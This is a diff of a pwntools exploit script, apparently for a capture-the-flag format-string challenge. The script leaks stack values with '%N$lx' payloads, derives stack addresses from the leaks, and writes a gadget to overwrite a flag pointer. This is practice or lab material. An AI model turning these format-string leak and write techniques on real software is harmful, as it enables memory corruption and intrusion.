@@ -6,7 +6,7 @@ from pwn import *
 from pwnlib.term import init
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF(args.EXE or "../src/printf3")
+exe = context.binary = ELF(args.EXE or "../src/printf2.debug")
 context.terminal = ["alacritty", "-e"]
 
 # Many built-in settings can be controlled on the command-line and show up
@@ -15,23 +15,7 @@ context.terminal = ["alacritty", "-e"]
 # ./exploit.py DEBUG NOASLR
 # ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
 host = args.HOST or "localhost"
-port = int(args.PORT or 4003)
-
-# Use the specified remote libc version unless explicitly told to use the
-# local system version with the `LOCAL_LIBC` argument.
-# ./exploit.py LOCAL LOCAL_LIBC
-if args.LOCAL_LIBC:
-    libc = exe.libc
-elif args.LOCAL:
-    library_path = libcdb.download_libraries("../../libc.so.6")
-    if library_path:
-        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
-        libc = exe.libc
-    else:
-        libc = ELF("../../libc.so.6")
-else:
-    libc = ELF("../../libc.so.6")
-
+port = int(args.PORT or 14002)
 
 def start_local(argv=[], *a, **kw):
     """Execute the target binary locally"""
@@ -62,7 +46,7 @@ def start(argv=[], *a, **kw):
 # ./exploit.py GDB
 gdbscript = """
 tbreak main
-#b *main+144
+b *vuln+210
 b read_flag
 continue
 """.format(
@@ -81,45 +65,48 @@ continue
 # Debuginfo:  Yes
 
 
-def get_stack_var(io: process | connect, index: int) -> bytes:
-    io.recvuntil(b"> ")
+def send_payload(io: process | connect, _payload: bytes, newline: bool = True) -> bytes:
+    io.recvuntil(b"$ ")
     io.sendline(b"1")
-    io.recvuntil(b"something: ")
-    io.sendline(f"%{index}$lx".encode("ascii"))
-    io.recvuntil(b"said: ")
-    return io.recvuntil(b"--", drop=True)
-
-
-def send_payload(io: process | connect, _payload: bytes):
-    io.recvuntil(b"> ")
-    io.sendline(b"1")
-    io.recvuntil(b"something: ")
+    io.recvuntil(b"write>")
     io.sendline(_payload)
-    io.recvuntil(b"said: ")
+    io.recvuntil(b"written> ")
+    recv = None
+    if newline:
+        recv = io.recvuntil(b"\n", drop=True)
+    else:
+        recv = io.recvuntil(b"n1k0", drop=True)
+    return recv 
+
+
+def get_stack_var(io: process | connect, index: int) -> bytes:
+    return send_payload(io, f"%{index}$lx".encode("ascii"), True)
 
 
 def read_flag(io: process | connect):
-    io.recvuntil(b"> ")
+    io.recvuntil(b"$ ")
     io.sendline(b"2")
+    return
 
 
 io = start()
 
 # leaking all the stack vars
-for i in range(1, 50):
-    leak = get_stack_var(io, i)
-    io.info(f"Leaked the {i}th stack var: {leak.decode('ascii')}.")
+#for i in range(1, 50):
+#    leak = get_stack_var(io, i)
+#    print(leak)
+#    io.info(f"Leaked the {i}th stack var: {leak.decode('ascii').strip()}.")
 
 # stack indices
-indices = {"rbp": 47, "flag": 7, "buffer": 8}
-indices["gadget"] = indices["buffer"] + 4
-indices["target"] = indices["gadget"] + 2
+indices = {"rbp": 22, "flag": 7, "buffer": 8}
+indices["gadget"] = indices["buffer"] + 2 # where the gadget lives
+indices["target"] = indices["gadget"] + 2 # where the flag is to be read
 addrs = {"rbp": 0, "flag": 0, "buffer": 0}
 
 # calculate addresses
-addrs["rbp"] = int(get_stack_var(io, indices["rbp"]), 16) - 0x118
-addrs["flag"] = addrs["rbp"] - 0x118 # there are two of these on the stack, and idk why
-addrs["buffer"] = addrs["rbp"] - 0x110
+addrs["rbp"] = int(get_stack_var(io, indices["rbp"]), 16) - 0xb0
+addrs["flag"] = addrs["rbp"] - 0x78
+addrs["buffer"] = addrs["rbp"] - 0x70
 io.success(f"Leaked rbp of main: {hex(addrs['rbp'])}")
 io.success(f"Leaked address of the buffer: {hex(addrs['buffer'])}")
 io.success(f"Leaked address of the flag pointer: {hex(addrs['flag'])}")
@@ -138,7 +125,7 @@ for i, short in enumerate(shorts, 0):
     # writing the gadget onto the stack
     payload = b"A" * ((indices["gadget"] - indices["buffer"]) * 8)
     payload += pack(addrs["flag"] + (i * 2))
-    send_payload(io, payload)
+    send_payload(io, payload, False)
 
     # use that gadget to overwrite the flag ptr
     payload = ""
